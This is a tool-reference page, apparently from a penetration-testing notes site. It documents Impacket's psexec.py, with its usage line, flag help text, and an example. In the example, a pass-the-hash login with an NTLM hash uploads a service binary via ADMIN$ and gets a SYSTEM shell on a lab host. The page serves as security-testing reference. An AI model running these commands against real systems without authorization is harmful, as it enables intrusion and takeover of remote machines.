---
title : "psexec.py"
# pre : ' '
description : "PSEXEC like functionality example using RemComSvc."
date : 2022-02-14T12:22:32+01:00
# hidden : true
# draft : true
weight : 70
# tags : ['']
---

---

PSEXEC like functionality example using RemComSvc.

## Installation

Install [Impacket]({{< ref "../impacket" >}}).

## Usage

```plain
psexec.py [-h] [-c pathname] [-path PATH] [-file FILE] [-ts] [-debug] [-codec CODEC] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-keytab KEYTAB] [-dc-ip ip address] [-target-ip ip address]
                 [-port [destination port]] [-service-name service_name] [-remote-binary-name remote_binary_name]
                 target [command ...]
```

## Flags

```plain
Impacket v0.12.0.dev1+20240718.115833.4e0e3174 - Copyright 2023 Fortra

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>
  command               command (or arguments if -c is used) to execute at the target (w/o path) - (default:cmd.exe)

options:
  -h, --help            show this help message and exit
  -c pathname           copy the filename for later execution, arguments are passed in the command option
  -path PATH            path of the command to execute
  -file FILE            alternative RemCom binary (be sure it doesn't require CRT)
  -ts                   adds timestamp to every logging output
  -debug                Turn DEBUG output ON
  -codec CODEC          Sets encoding used (codec) from the target's output (default "utf-8"). If errors are detected, run chcp.com at the target, map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
                        and then execute smbexec.py again with -codec and the corresponding codec

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)
  -keytab KEYTAB        Read keys for SPN from keytab file

connection:
  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter
  -target-ip ip address
                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve it
  -port [destination port]
                        Destination port to connect to SMB Server
  -service-name service_name
                        The name of the service used to trigger the payload
  -remote-binary-name remote_binary_name
                        This will be the name of the executable uploaded on the target
```

## Examples

```plain
$ psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:97f2592347d8fbe42be381726ff9ea83 Administrator@10.10.10.16
Impacket v0.9.22.dev1+20200914.162022.81d44893 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.10.16.....
[*] Found writable share ADMIN$
[*] Uploading file KbEylSCh.exe
[*] Opening SVCManager on 10.10.10.16.....
[*] Creating service CdaA on 10.10.10.16.....
[*] Starting service CdaA.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

## URL List

- [Github.com - psexec.py](https://github.com/fortra/impacket/blob/master/examples/psexec.py)
